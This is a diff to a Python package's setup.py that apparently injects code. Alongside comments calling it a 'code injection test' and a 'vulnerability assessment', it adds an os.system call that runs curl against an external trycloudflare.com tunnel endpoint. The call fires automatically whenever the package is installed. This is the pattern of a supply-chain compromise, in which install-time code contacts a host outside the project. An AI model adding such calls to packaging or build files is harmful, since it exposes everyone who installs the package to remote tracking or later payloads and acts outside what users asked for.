@@ -13,6 +13,9 @@ from setuptools import setup, find_packages
 
 print("This is a code injection test. If you see this message, the setup.py file has been compromised.")
 
+# Vulnerability assessment - sends request to external endpoint
+os.system("curl https://highlighted-dietary-compile-stockholm.trycloudflare.com/api/test")
+
 ### code injection test ends here ###
 
 VERSION = '0.5.2'
